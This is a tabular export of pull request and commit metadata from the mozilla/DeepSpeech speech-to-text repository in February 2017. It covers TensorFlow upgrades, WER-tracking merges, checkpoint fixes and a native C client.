3926,https://api.github.com/repos/mozilla/DeepSpeech/pulls/404,404,Fixed #403,,kdavis-mozilla,12054740,2017-02-24T09:36:48Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f931272986b1a62f2cd2b555a5ad495093823f9,Fixed #403
3927,https://api.github.com/repos/mozilla/DeepSpeech/pulls/401,401,Fixed #398,Added doc indicating git lfs is required,kdavis-mozilla,12054740,2017-02-23T15:33:21Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9cfba5ed6b015611af5c884401aed8d1e576ab1c,Fixed #398
3928,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e4f54b1f13dd01589a74ede5323efe0a198ca4a,Allow persisting the model on epoch 0
3929,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0f4b435a79845ba23f3529c5e985f9c6fde3fb9,Fix a few indentation errors leftover from notebook conversion
3930,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,686d042beb7520a238391227b416b0c731151092,Respect session config environment variables during exporting
3931,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8b9476294002c3af1253cbcbb11f188dd3a8456b,"Merge pull request #386 from mozilla/minorfixes

Minor fixes"
3932,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86d6ef08a8ac4c013e30458ec1f0d073a1007224,"Added Kneser-Ney, 4-gram, 30k word LM"
3933,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e266f2fc3da594f86690e42745ce84d94e960dd,Temp fix of #8 until tensorflow/tensorflow#6034 is fixed
3934,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,df1125f7a7bf05bbed8b051203947a2863f50568,Allow checkpointing and validation at end of epoch 0 (fixes #392)
3935,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1c4c3558c2b8cefa96f908e2ff74d3d3e623fc9,"Merge pull request #393 from mozilla/issue392

Allow checkpointing and validation at end of epoch 0 (fixes #392)"
3936,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e00655321efb76f82b523c73728fb7b1d7785066,Addressed review comments
3937,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3469261406bc06096e40115949bb83d194bce82,"Merge pull request #394 from mozilla/issue8

Issue8"
3938,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3838c0a9ce6d1914ef40e1ceff11808bfd56dd84,Upgrade to run on Tensorflow 1.0.0
3939,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afeed91a7e298f96790cc5b6b1c1c85c89320f7c,"Fix variable scope

ValueError: Variable b1/Adam/ does not exist, or was not created with
tf.get_variable(). Did you mean to set reuse=None in VarScope?"
3940,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1ce790e4ec9ac92f93ce03fe2ff01a9360f5409,Fix issue #395
3941,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a25a9bc17422c36d0a3d4dcd6b0cc29636ec7d6e,"Merge pull request #396 from mozilla/issue395

Fix issue #395"
3942,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd571695cefd34d633b65f06a2ed54618c555980,"Merge pull request #389 from lissyx/tf-1.0.0

Tf 1.0.0"
3943,https://api.github.com/repos/mozilla/DeepSpeech/pulls/397,397,Merge wer,,lissyx,1645737,2017-02-22T16:10:33Z,COLLABORATOR,True,94773,70,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29998bec601a041a29fdd971d58576b615114928,Merge remote-tracking branch 'upstream/master' into merge-wer
3944,https://api.github.com/repos/mozilla/DeepSpeech/pulls/396,396,Fix issue #395,,kdavis-mozilla,12054740,2017-02-22T15:42:20Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1ce790e4ec9ac92f93ce03fe2ff01a9360f5409,Fix issue #395
3945,https://api.github.com/repos/mozilla/DeepSpeech/pulls/394,394,Issue8,Temporary resolution of issue #8 and issue #10 until issue tensorflow/tensorflow#6034 is resolved,kdavis-mozilla,12054740,2017-02-22T05:53:43Z,CONTRIBUTOR,True,94697,1,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86d6ef08a8ac4c013e30458ec1f0d073a1007224,"Added Kneser-Ney, 4-gram, 30k word LM"
3946,https://api.github.com/repos/mozilla/DeepSpeech/pulls/394,394,Issue8,Temporary resolution of issue #8 and issue #10 until issue tensorflow/tensorflow#6034 is resolved,kdavis-mozilla,12054740,2017-02-22T05:53:43Z,CONTRIBUTOR,True,94697,1,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e266f2fc3da594f86690e42745ce84d94e960dd,Temp fix of #8 until tensorflow/tensorflow#6034 is fixed
3947,https://api.github.com/repos/mozilla/DeepSpeech/pulls/394,394,Issue8,Temporary resolution of issue #8 and issue #10 until issue tensorflow/tensorflow#6034 is resolved,kdavis-mozilla,12054740,2017-02-22T05:53:43Z,CONTRIBUTOR,True,94697,1,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e00655321efb76f82b523c73728fb7b1d7785066,Addressed review comments
3948,https://api.github.com/repos/mozilla/DeepSpeech/pulls/393,393,Allow checkpointing and validation at end of epoch 0 (fixes #392),"Commit 6e4f54b1f13dd01589a74ede5323efe0a198ca4a fixed the underlying bug that used to require this extra test, so we just need to remove it.",reuben,477142,2017-02-21T19:59:21Z,MEMBER,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,df1125f7a7bf05bbed8b051203947a2863f50568,Allow checkpointing and validation at end of epoch 0 (fixes #392)
3949,https://api.github.com/repos/mozilla/DeepSpeech/pulls/389,389,Tf 1.0.0,,lissyx,1645737,2017-02-16T16:47:20Z,COLLABORATOR,True,63,60,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3838c0a9ce6d1914ef40e1ceff11808bfd56dd84,Upgrade to run on Tensorflow 1.0.0
3950,https://api.github.com/repos/mozilla/DeepSpeech/pulls/389,389,Tf 1.0.0,,lissyx,1645737,2017-02-16T16:47:20Z,COLLABORATOR,True,63,60,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afeed91a7e298f96790cc5b6b1c1c85c89320f7c,"Fix variable scope

ValueError: Variable b1/Adam/ does not exist, or was not created with
tf.get_variable(). Did you mean to set reuse=None in VarScope?"
3951,https://api.github.com/repos/mozilla/DeepSpeech/pulls/388,388,Revert repository to before decomposition PR,"Reverts commit 8f341cf2b77d7215314cc2f8c286562b6c60c93c, commit 2b513d06308e2805942e209332f07e28849c050c, commit b27cf0325009e0fb151c278b1cc856078b45206b, commit d8856a94c83a92cbba01d2ae4b4fd17a84cb520c, commit e39f7cfe2773e70aea65c9ec6309e574c839afc4, commit 06ad0d802677f5d8deca8dc24762167951f3050d, commit 2c832169de49e554000ba049c1d1c80f0795e5ea.

If this fixes the server crashes, then we need to reapply the changes that happened after the decomposition PR. @lissyx, this reverts #376, do we need to move some files around in the server before merging?",reuben,477142,2017-02-15T21:41:57Z,MEMBER,False,2071,1915,30,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d1ab920fbb417491502f5ac47adb92ec304c938,"Revert repository to before decomposition PR

Reverts commit 8f341cf2b77d7215314cc2f8c286562b6c60c93c,
commit 2b513d06308e2805942e209332f07e28849c050c,
commit b27cf0325009e0fb151c278b1cc856078b45206b,
commit d8856a94c83a92cbba01d2ae4b4fd17a84cb520c,
commit e39f7cfe2773e70aea65c9ec6309e574c839afc4,
commit 06ad0d802677f5d8deca8dc24762167951f3050d,
commit 2c832169de49e554000ba049c1d1c80f0795e5ea."
3952,https://api.github.com/repos/mozilla/DeepSpeech/pulls/387,387,Tensorflow 1.0.0,,lissyx,1645737,2017-02-15T14:28:33Z,COLLABORATOR,False,38,37,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a8c83da831d46e748b01eb2d925891d157747d81,Fixed #106
3953,https://api.github.com/repos/mozilla/DeepSpeech/pulls/387,387,Tensorflow 1.0.0,,lissyx,1645737,2017-02-15T14:28:33Z,COLLABORATOR,False,38,37,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00013ce2d4b3c16384f1772aee074284691e5897,Upgrade to run on Tensorflow 0.12
3954,https://api.github.com/repos/mozilla/DeepSpeech/pulls/387,387,Tensorflow 1.0.0,,lissyx,1645737,2017-02-15T14:28:33Z,COLLABORATOR,False,38,37,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8b1ac5ae309ea877400dbfe94c5049635e53c701,"Fix variable scope on TF 0.12

ValueError: Variable b1/Adam/ does not exist, or was not created with
tf.get_variable(). Did you mean to set reuse=None in VarScope?"
3955,https://api.github.com/repos/mozilla/DeepSpeech/pulls/387,387,Tensorflow 1.0.0,,lissyx,1645737,2017-02-15T14:28:33Z,COLLABORATOR,False,38,37,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6345a73261a81e7fd5a89a06404cbf0fd6b9f46,Upgrade to run on Tensorflow 1.0.0-rc2
3956,https://api.github.com/repos/mozilla/DeepSpeech/pulls/386,386,Minor fixes,Some minor fixes I made while working on #340.,reuben,477142,2017-02-14T10:56:27Z,MEMBER,True,10,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e4f54b1f13dd01589a74ede5323efe0a198ca4a,Allow persisting the model on epoch 0
3957,https://api.github.com/repos/mozilla/DeepSpeech/pulls/386,386,Minor fixes,Some minor fixes I made while working on #340.,reuben,477142,2017-02-14T10:56:27Z,MEMBER,True,10,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0f4b435a79845ba23f3529c5e985f9c6fde3fb9,Fix a few indentation errors leftover from notebook conversion
3958,https://api.github.com/repos/mozilla/DeepSpeech/pulls/386,386,Minor fixes,Some minor fixes I made while working on #340.,reuben,477142,2017-02-14T10:56:27Z,MEMBER,True,10,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,686d042beb7520a238391227b416b0c731151092,Respect session config environment variables during exporting
3959,https://api.github.com/repos/mozilla/DeepSpeech/pulls/385,385,Merge #374 and #340 fixes into wer-tracking,,reuben,477142,2017-02-14T10:45:40Z,MEMBER,True,107,39,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,523e414234b04534ead3a05606bd8f42ec2b3932,Make dropout configurable per-layer
3960,https://api.github.com/repos/mozilla/DeepSpeech/pulls/385,385,Merge #374 and #340 fixes into wer-tracking,,reuben,477142,2017-02-14T10:45:40Z,MEMBER,True,107,39,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b27cf0325009e0fb151c278b1cc856078b45206b,"Merge pull request #371 from Cwiiis/dropout-config

Make dropout configurable per-layer, fixes #372"
3961,https://api.github.com/repos/mozilla/DeepSpeech/pulls/385,385,Merge #374 and #340 fixes into wer-tracking,,reuben,477142,2017-02-14T10:45:40Z,MEMBER,True,107,39,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f63b2e89a1833ac9735e2c7efe1ef84ec5143b8,"Move some data to be stored on /data

Settting temp directory to be in /data, and DATA_DIR to /data,
defaulting to XDG_DATA_HOME.

Fixes #374"
3962,https://api.github.com/repos/mozilla/DeepSpeech/pulls/385,385,Merge #374 and #340 fixes into wer-tracking,,reuben,477142,2017-02-14T10:45:40Z,MEMBER,True,107,39,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b513d06308e2805942e209332f07e28849c050c,"Merge pull request #376 from lissyx/issue374

Move big data write to /data"
3963,https://api.github.com/repos/mozilla/DeepSpeech/pulls/385,385,Merge #374 and #340 fixes into wer-tracking,,reuben,477142,2017-02-14T10:45:40Z,MEMBER,True,107,39,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6903cd3f3c63b88f36f0ef51b5c131f8976acf96,Don't create DataSet objects for data sets we will not use
3964,https://api.github.com/repos/mozilla/DeepSpeech/pulls/385,385,Merge #374 and #340 fixes into wer-tracking,,reuben,477142,2017-02-14T10:45:40Z,MEMBER,True,107,39,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f341cf2b77d7215314cc2f8c286562b6c60c93c,"Merge pull request #383 from mozilla/issue340_unused_importers

Don't create DataSet objects for data sets we will not use"
3965,https://api.github.com/repos/mozilla/DeepSpeech/pulls/383,383,Don't create DataSet objects for data sets we will not use,I completed one full TED epoch on the server with this code without problems.,reuben,477142,2017-02-13T22:39:59Z,MEMBER,True,61,27,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6903cd3f3c63b88f36f0ef51b5c131f8976acf96,Don't create DataSet objects for data sets we will not use
3966,https://api.github.com/repos/mozilla/DeepSpeech/pulls/380,380,"Implement a native client using TensorFlow C API, Issue #379","kiss_fft130 is a drop-in library, ignore it for the purpose of review (unless you really really want to review kiss_fft... In which case, I only use kiss_fft(r).[ch] :)). c_speech_features produces (practically) identical results to python_speech_features in my testing, and the included client works with multiple ldc models I've tried, producing identical results to DeepSpeech.py. I've not yet tried it with a ted model, but it shouldn't make a difference.",Cwiiis,668518,2017-02-13T16:31:07Z,CONTRIBUTOR,True,5752,11,50,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2740336d089b592f905e0236a686aa71096dd28f,Implement a native client using TensorFlow C API
3967,https://api.github.com/repos/mozilla/DeepSpeech/pulls/378,378,Merge wer,,lissyx,1645737,2017-02-13T14:47:00Z,COLLABORATOR,False,46,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,523e414234b04534ead3a05606bd8f42ec2b3932,Make dropout configurable per-layer
3968,https://api.github.com/repos/mozilla/DeepSpeech/pulls/378,378,Merge wer,,lissyx,1645737,2017-02-13T14:47:00Z,COLLABORATOR,False,46,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b27cf0325009e0fb151c278b1cc856078b45206b,"Merge pull request #371 from Cwiiis/dropout-config

Make dropout configurable per-layer, fixes #372"
3969,https://api.github.com/repos/mozilla/DeepSpeech/pulls/378,378,Merge wer,,lissyx,1645737,2017-02-13T14:47:00Z,COLLABORATOR,False,46,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f63b2e89a1833ac9735e2c7efe1ef84ec5143b8,"Move some data to be stored on /data

Settting temp directory to be in /data, and DATA_DIR to /data,
defaulting to XDG_DATA_HOME.

Fixes #374"
3970,https://api.github.com/repos/mozilla/DeepSpeech/pulls/378,378,Merge wer,,lissyx,1645737,2017-02-13T14:47:00Z,COLLABORATOR,False,46,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b513d06308e2805942e209332f07e28849c050c,"Merge pull request #376 from lissyx/issue374

Move big data write to /data"
3971,https://api.github.com/repos/mozilla/DeepSpeech/pulls/378,378,Merge wer,,lissyx,1645737,2017-02-13T14:47:00Z,COLLABORATOR,False,46,12,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,492e080ca45263eb1d6320b0ede686ea8d5c92a3,Merge remote-tracking branch 'upstream/master' into merge_wer
3972,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ec213b69c62f6f398bb8cad11df9f1a5e0a2a96,"Merge pull request #95 from lissyx/wer-update

Wer update"
3973,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,15d621b9c7a634612bcd21ed4c3096f633f82bf1,"Merge pull request #98 from lissyx/wer-update

Wer update"
3974,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,092e5cd6a2aeb6f468dcf23efeed8986601c1ff3,"Merge pull request #103 from lissyx/wer-update

Wer update"
3975,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a851136acf23c4a9fe294ba5232c6da8924770ff,Merge remote-tracking branch 'upstream/master' into wer-update
3976,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89ee4f6557cd4f621e9ee517cc3719c9046143a0,"Merge pull request #119 from lissyx/wer-update

Wer update"
3977,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,083474f90a234d58bee31e2814a23b9877a8f779,Merge remote-tracking branch 'upstream/master' into wer-update
3978,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9c9103a1ef11734273cf59317f6f7986615fa63,"Merge pull request #123 from lissyx/wer-update

Wer update"
3979,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dc951d6b2f75f06ceb68dd8057e417e409e737b,Merge remote-tracking branch 'upstream/master' into wer-update
3980,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fad4e30037c298e92dcb5a1cbc31f6a79070fdc,"Merge pull request #137 from lissyx/wer-update

Wer update"
3981,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25dbf39622d38928ffa75c8fc71b1edb123f410d,Merge remote-tracking branch 'upstream/master' into wer-update
3982,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b56e26c51d9a2c1dca5cacac924400ac7d05a27b,"Merge pull request #140 from lissyx/wer-update

Wer update"
3983,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c0e99ab53ff70198fbe6276ccbd4e9955c9aa58,Merge remote-tracking branch 'upstream/master' into wer-update
3984,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41f6498781db6e8a9ddb5f9f30da1933ae017f54,"Merge pull request #152 from lissyx/wer-update

Wer update"
3985,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea391ee657e8f7c79c7510df881185db8ad6766e,Merge remote-tracking branch 'upstream/master' into wer-update
3986,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c7758dbb9a3747a39dac50147b237fd766ac7b7,"Merge pull request #155 from lissyx/wer-update

Wer update"
3987,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,facc42bec0bee7d9a2de3b1377ffcf4f8d05cb5a,Merge remote-tracking branch 'upstream/master' into wer-update
3988,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e29e72d090e9a13865b6cf9119d1abad4b9a15b,"Merge pull request #162 from lissyx/wer-update

Wer update"
3989,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f13e44a0dfc3fd747ba0a8413b8b1ab5613343d1,Merge remote-tracking branch 'upstream/master' into wer-update
3990,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6c7dd333586e856fe4b8a0149dac09fbeebafc0,"Merge pull request #170 from lissyx/wer-update

Wer update"
3991,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f582d76f83d90cefa2d8866134898f5ff8c01333,Merge remote-tracking branch 'upstream/master' into wer-update
3992,https://api.github.com/repos/mozilla/DeepSpeech/pulls/377,377,Merge wer,,lissyx,1645737,2017-02-13T14:43:12Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11c3cc652af1623ee7fbe8abc6db55ac61fde7cb,"Merge pull request #180 from lissyx/wer-update

Wer update"
